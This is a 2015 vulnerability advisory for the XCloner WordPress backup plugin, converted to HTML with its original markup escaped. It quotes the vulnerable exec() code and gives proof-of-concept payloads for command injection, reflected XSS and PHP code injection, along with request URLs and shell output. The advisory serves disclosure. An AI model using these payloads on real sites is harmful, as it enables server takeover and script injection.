<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title></title>
<meta name="generator" content="HTML::TextToHTML v2.51"/>
</head>
<body>
<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
    white-space: -moz-pre-wrap; /</em> Firefox <em>/
    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
    white-space: -o-pre-wrap;   /</em> Opera 7 */
    word-wrap: break-word;<br/>
}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 121&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Xloner v3.1.2 wordpress plugin authenticated command execution and XSS&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2015-05-10&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://wordpress.org/plugins/xcloner-backup-and-restore/">https://wordpress.org/plugins/xcloner-backup-and-restore/</a>"&gt;<a href="https://wordpress.org/plugins/xcloner-backup-and-restore/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://wordpress.org/plugins/xcloner-backup-and-restore/&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;Ovidiu Liuta, @thinkovi&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2015-07-16&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; @thinkovi&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;XCloner is a Backup and Restore component designed for PHP/Mysql websites, it can work as a native plugin for WordPress and Joomla!&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;Lines 1129 of 1135 in cloner.functions.php
</p><p>1129 $excluded_cmd = &amp;quot;&amp;quot;;<br/>
1130 if ($fp = @fopen($<u>REQUEST[&amp;#039;excl</u>manual&amp;#039;], &amp;quot;r&amp;quot;)) {
1131 while (!feof($fp))<br/>
1132 $excluded_cmd .= fread($fp, 1024);
1133<br/>
1134 fclose($fp);<br/>
1135 }
</p><p>Line 1205:<br/>
If configured for manual mode the contents of $excluded_cmd are passed to exec();
1205 exec($<u>CONFIG[tarpath] . &amp;quot; $excluded</u>cmd &amp;quot;. $<u>CONFIG[&amp;#039;tarcompress&amp;#039;] .&amp;quot;vf $backup</u>file update $file&amp;quot;);
We need to supply a file with a list of commands to execute in it, we can create this via the backup comments feature. It creates a file under administrator/backups/.comments with whatever you want in it. Like ;id&amp;gt;/tmp/w00t;
</p><p>Then change the configuration to manual backup by selecting the radio button and perform a backup.
Hit this link:<br/>
<a href="http://www.vapidlabs.internal/wpadmin/plugins.php?page=xcloner_show&amp;amp;option=com_cloner&amp;amp;task=refresh&amp;amp;json=0&amp;amp;startf=300&amp;amp;lines=6204&amp;amp;backup=backup_20150511_">http://www.vapidlabs.internal/wpadmin/plugins.php?page=xcloner_show&amp;amp;option=com_cloner&amp;amp;task=refresh&amp;amp;json=0&amp;amp;startf=300&amp;amp;lines=6204&amp;amp;backup=backup_20150511_</a>
2028_sqlnodrop.tar&amp;amp;excl_manual=/usr/share/wordpress/administrator/backups/.comments
</p><p>In a shell:<br/>
$ cat /tmp/w00t<br/>
uid=33(wwwdata)<br/>
gid=33(wwwdata)<br/>
groups=33(wwwdata)
</p><p>Also $excluded_cmd is XSS
</p><p><a href="http://www.vapidlabs.internal/wpadmin/plugins.php?page=xcloner_show&amp;amp;option=com_cloner&amp;amp;task=refresh&amp;amp;json=0&amp;amp;startf=800&amp;amp;lines=6204&amp;amp;backup=backup_20150511_">http://www.vapidlabs.internal/wpadmin/plugins.php?page=xcloner_show&amp;amp;option=com_cloner&amp;amp;task=refresh&amp;amp;json=0&amp;amp;startf=800&amp;amp;lines=6204&amp;amp;backup=backup_20150511_</a>
2028_sqlnodrop.tar&amp;amp;excl_manual=&amp;#039;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#039;w00t&amp;#039;);&amp;lt;/script&amp;gt;
</p><p>Chrome XSS alert:
</p><p>The XSS Auditor refused to execute a script in
&amp;#039;<a href="http://www.vapidlabs.internal/wpadmin/plugins.php?page=xcloner_show&amp;amp;option=com_&amp;hellip;lnodrop.tar&amp;amp;excl_manual=%27%3E%3Cscript%3Ealert">http://www.vapidlabs.internal/wpadmin/plugins.php?page=xcloner_show&amp;amp;option=com_&amp;hellip;lnodrop.tar&amp;amp;excl_manual=%27%3E%3Cscript%3Ealert</a>(%27w00t%27);%3C/script%3E&amp;#039; because
its source code was found within the request. The auditor was enabled as the server sent
neither an &amp;#039;XXSSProtection&amp;#039; nor &amp;#039;ContentSecurityPolicy&amp;#039; header.
<a href="ftp://plugins.php/403">plugins.php:403</a> The XSS Auditor refused to execute a script in
&amp;#039;<a href="http://www.vapidlabs.internal/wpadmin/plugins.php?page=xcloner_show&amp;amp;option=com_&amp;hellip;lno">http://www.vapidlabs.internal/wpadmin/plugins.php?page=xcloner_show&amp;amp;option=com_&amp;hellip;lno</a>
drop.tar&amp;amp;excl_manual=%27%3E%3Cscript%3Ealert(%27w00t%27);%3C/script%3E&amp;#039; because
its source code was found within the request. The auditor was enabled as the server sent
neither an &amp;#039;XXSSProtection&amp;#039; nor &amp;#039;ContentSecurityPolicy&amp;#039; header.
</p><p>The default template has an error with the LM_LOGIN_TEXT field so just clean that out or you will get a syntax error when trying to execute.
Adding foo&amp;#039;);phpinfo();define(&amp;#039;foo to the Translation LM_FRONT_* fields then browsing to language/italian.php you will execute phpinfo();.
</p><p>CVE-2015-4336 Remote Code Exec<br/>
CVE-2015-4337 XSS in $excluded_cmd<br/>
CVE-2015-4338 php code Injection &lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-2015-4336 2015-4337 2015-4338&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=121"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; [&lt;a href="/m/xcloner2-1.png"&gt;xcloner2-1.png&lt;/a&gt;][&lt;a href="/m/xcloner2-2.png"&gt;xcloner2-2.png&lt;/a&gt;][&lt;a href="/m/mitre-email.txt"&gt;mitre-email.txt&lt;/a&gt;]&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisory.php?v=121">http://www.vapid.dhs.org/advisory.php?v=121</a>"&gt;<a href="http://www.vapid.dhs.org/advisory.php?v=121&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisory.php?v=121&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
&lt;/html&gt;
</p>

</body>
</html>
